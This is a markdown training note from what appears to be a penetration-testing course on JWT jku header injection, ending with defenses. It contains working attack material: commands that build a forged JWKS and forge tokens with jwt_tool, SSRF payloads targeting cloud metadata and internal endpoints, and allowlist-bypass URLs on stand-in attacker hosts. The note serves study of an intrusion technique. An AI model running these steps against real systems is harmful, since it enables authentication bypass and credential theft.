---
tags: [vapt, jwt, intermediate]
difficulty: intermediate
module: "18 - JWT"
topic: "18.08 JWT Header Injection — jku claim"
portswigger_labs: ["JWT authentication bypass via jku header injection"]
---

# 18.08 — JWT Header Injection: jku Claim

## What Is the jku Header?

```
JKU (JWK Set URL):
  A URL in the JWT header pointing to a JWKS (JWK Set) endpoint
  Server fetches the public key FROM that URL to verify the JWT
  
  JWT HEADER:
  {
    "alg": "RS256",
    "typ": "JWT",
    "kid": "my-key-id",
    "jku": "https://example.com/.well-known/jwks.json"
  }
  
THE ATTACK:
  Change jku to point to ATTACKER'S server:
  {
    "alg": "RS256",
    "typ": "JWT",
    "kid": "my-key-id",
    "jku": "https://attacker.com/evil-jwks.json"
  }
  
  Vulnerable server: Fetches key from attacker's URL!
  Attacker's JWKS: Returns attacker's public key
  Attacker: Signed JWT with their private key
  → Server verifies with attacker's public key → MATCH → Access!
```

---

## Attack Steps

```
STEP 1: Set up your JWKS endpoint:
  a) Generate RSA key pair:
     openssl genrsa -out attacker.pem 2048
     
  b) Create JWKS JSON with your public key:
     python3 -c "
     from cryptography.hazmat.primitives.serialization import load_pem_private_key, Encoding, PublicFormat
     from cryptography.hazmat.backends import default_backend
     import base64, json, struct
     
     with open('attacker.pem','rb') as f:
         priv = load_pem_private_key(f.read(), None, default_backend())
     pub = priv.public_key()
     pub_numbers = pub.public_numbers()
     
     def to_base64url(n):
         b = n.to_bytes((n.bit_length() + 7) // 8, 'big')
         return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
     
     jwks = {
         'keys': [{
             'kty': 'RSA',
             'kid': 'attacker-key-1',
             'n': to_base64url(pub_numbers.n),
             'e': to_base64url(pub_numbers.e)
         }]
     }
     print(json.dumps(jwks, indent=2))
     " > evil-jwks.json

  c) Serve it:
     python3 -m http.server 8080
     # OR: Use Burp Collaborator (for blind testing)
     # OR: Host on any internet-accessible server

STEP 2: Craft JWT with jku pointing to your server:
  python3 jwt_tool.py TOKEN -X s -ju http://YOUR_SERVER/evil-jwks.json
  # -X s = exploit jku (server-side request forgery via jku)
  # -ju = jku URL

STEP 3: Tamper payload if needed:
  python3 jwt_tool.py TOKEN -X s -ju http://YOUR_SERVER/evil-jwks.json -T
  
STEP 4: Use forged token:
  curl https://target.com/admin -H "Authorization: Bearer FORGED_TOKEN"
  → Server fetches your JWKS → verifies with your key → accepts!
```

---

## SSRF via jku

```
EXTRA ATTACK SURFACE:
  jku causes the SERVER to make an HTTP request to the URL you specify
  
  → This is SSRF (Server-Side Request Forgery)!
  
  Even if the JWT itself isn't accepted (server validates iss/aud correctly),
  you might still get SSRF for internal network scanning!
  
  Set jku to internal URLs:
  "jku": "http://169.254.169.254/latest/meta-data/"  → AWS metadata!
  "jku": "http://192.168.1.1/admin"                  → internal admin
  "jku": "http://localhost:8080/actuator/env"         → Spring Boot actuator
  
  The server will try to fetch these as JWKS
  → Even if it fails to parse as JWKS, you've confirmed SSRF!
  → Use Burp Collaborator in jku to detect blind SSRF
```

---

## jku Validation Bypass

```
SOME SERVERS PARTIALLY VALIDATE jku:
  "Only allow jku from trusted domains"
  
BYPASS ATTEMPTS:
  Trusted domain as subdomain of attacker:
  "jku": "https://trusted.com.evil.com/jwks.json"
  
  Trusted domain in URL path:
  "jku": "https://evil.com/trusted.com/jwks.json"
  
  Open redirect on trusted domain:
  "jku": "https://trusted.com/redirect?url=https://evil.com/jwks.json"
  
  Subdomain takeover on trusted domain:
  "jku": "https://abandoned.trusted.com/jwks.json"
  (If attacker controls the subdomain → host the JWKS there!)
  
  Fragment bypass:
  "jku": "https://trusted.com/.well-known/jwks.json#https://evil.com/jwks.json"
  (Fragment ignored by HTTP, but regex check might see "trusted.com")
```

---

## Fix

```
DEFENSES:
  ✓ Don't trust jku from the JWT header to determine verification key!
  ✓ If JWKS-based key lookup needed: use a HARDCODED, INTERNAL URL
    Not the URL from the token!
    
  ✓ If jku must be supported: strict URL allowlist
    Allowlist = ["https://auth.example.com/.well-known/jwks.json"]
    Block: any URL not in allowlist
    
  ✓ Prevent SSRF: Don't make outbound HTTP requests based on JWT content
  
  ✓ Best: hardcode the verification key (PEM file on server)
    No external fetching at all!
    
  # Python example:
  with open('/etc/app/trusted_public.pem', 'r') as f:
      VERIFICATION_KEY = f.read()
  # Never let the token dictate where to fetch the key!
```

---

## Related Notes
- [[07 - JWT Header Injection jwk claim]] — embedded key in header
- [[09 - JWT Header Injection kid claim]] — key ID injection
- [[Module 13 - SSRF]] — SSRF via jku
- [[18 - Defense Strong Algorithms Validation Short Expiry]] — fix
